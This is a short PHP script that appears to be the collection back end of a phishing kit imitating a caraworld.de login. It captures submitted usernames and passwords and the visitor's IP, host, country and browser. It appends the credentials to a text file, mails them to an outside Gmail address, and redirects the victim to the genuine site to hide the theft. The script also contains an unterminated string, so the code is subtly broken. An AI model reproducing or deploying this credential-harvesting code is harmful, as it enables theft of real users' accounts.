<?php

$name = "username";
$password = "password";
$subj = "cara";
header("Location: index.html");

$user = $_POST[$name];
$pass = $_POST[$password];
$ip = getenv('REMOTE_ADDR');
$hostname = gethostbyaddr($ip);
$country = getenv('GEOIP_COUNTRY_NAME');
$browser= getenv('HTTP_USER_AGENT');


$msg = "
USER: $user
PASS: $pass

$fh = fopen("caraussurs.txt",'a');
fputs($fh,  $msg);
fclose($fh);


mail("formulainter5@gmail.com", $subj, $msg);
header("Location: https://www.caraworld.de/mein-caraworld");
?>